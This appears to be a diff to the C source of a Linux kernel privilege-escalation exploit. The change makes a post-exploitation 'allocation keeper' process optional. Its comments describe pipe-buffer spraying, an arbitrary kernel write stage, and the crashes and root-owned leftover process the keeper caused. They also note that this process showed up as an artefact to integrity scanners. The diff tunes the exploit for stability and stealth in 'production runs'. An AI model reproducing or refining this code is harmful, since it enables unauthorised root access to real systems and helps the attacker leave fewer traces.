@@ -518,16 +518,29 @@ int run_exploit(int argc, char **argv) {
   int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
   if (exploit_ok) {
     /*
-     * Release the pipe arsenal before forking the keeper: F_SETPIPE_SZ
-     * growth is charged per-real-uid (fs.pipe-user-pages-soft), and the
-     * keeper would otherwise inherit hundreds of 32-slot pipes, pushing
-     * any subsequent run on this boot past the soft limit -> EPERM.
-     * The keeper only needs to pin the memfd slabs and the payload skb.
+     * Release the pipe arsenal before returning: F_SETPIPE_SZ growth is
+     * charged per-real-uid (fs.pipe-user-pages-soft), and any later run on
+     * this boot would otherwise hit the soft limit -> EPERM.
      */
     reset_pipe_attempt();
-    pid_t keeper = spawn_allocation_keeper();
-    pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
-               keeper);
+    /*
+     * The allocation keeper used to be forked here unconditionally.  It runs
+     * with PR_SET_PDEATHSIG 0 + setsid() + nanosleep(86400), so it outlives
+     * the payload and pins the reclaimed kernel pages forever.  Those pages
+     * are exactly the ones the arbitrary-write stage wrote into; pinning them
+     * keeps any corruption they carry alive for the rest of the boot, and the
+     * panic then fires in an unrelated process (list_del corruption in
+     * move_freepages_block) minutes later.  It also leaves a root-owned
+     * process named cve43499-hold behind as an integrity-scanner artefact.
+     * It is now opt-in for diagnostics only; production runs do not fork it.
+     */
+    if (getenv("CVE43499_HOLD_PAGES")) {
+      pid_t keeper = spawn_allocation_keeper();
+      pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
+                 keeper);
+    } else {
+      pr_info("allocation keeper skipped; reclaimed pages released\n");
+    }
   }
   return exploit_ok ? 0 : 1;
 }
